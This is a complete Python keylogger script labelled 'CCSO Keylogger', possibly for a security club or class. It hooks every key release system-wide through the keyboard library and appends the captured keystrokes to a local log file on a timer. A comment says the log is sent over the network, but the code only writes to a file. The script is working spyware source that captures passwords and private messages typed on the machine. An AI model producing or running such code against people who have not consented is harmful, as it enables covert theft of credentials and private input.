import argparse
import textwrap
import threading
import keyboard
import sys

# Classes for good python developer standards :)!
class Keylogger:
    def __init__(self):
        self.args = args
        self.log = ""
        self.interval = args.interval
        self.timer = threading.Timer(interval=self.interval, function=self.send_log)

    # Handles the keyboard events, called whenever there is a keypress
    def callback(self, event):
        name = event.name

        # Format specific characters
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def loop_send_log(self):
        self.send_log()
        # Create a timer to run this fuction again, 5 minutes in the future:
        self.timer = threading.Timer(
            interval=self.interval, function=self.loop_send_log)
        self.timer.start()

    # Send log over the network
    def send_log(self):
        print("Updating log")
        if self.log:
            # Write the log to a file
            logFile = open(self.args.outfile, "a")
            logFile.writelines(self.log)
            logFile.close()

        self.log = ""

    # Start the keylogger
    def start(self):
        # Initialize keylogger
        try:
            # Attach our callback method to keypresses:
            keyboard.on_release(callback=self.callback)
            # Start the loop to send the log:
            self.loop_send_log()
            # Block thread until app is exited:
            keyboard.wait()

        # Handle a CTRL-C (when the user wants to exit)
        except KeyboardInterrupt:
            # Stop our loop:
            self.timer.cancel()
            # Write anything still left in the RAM:
            self.send_log()
            # Exit the app:
            sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
        python3 ./keylogger.py -o keys.txt
    '''))
    parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')
    parser.add_argument('-i', '--interval', default=5, help='Loop interval to write to the log.')

    args = parser.parse_args()

    kl = Keylogger()
    kl.start()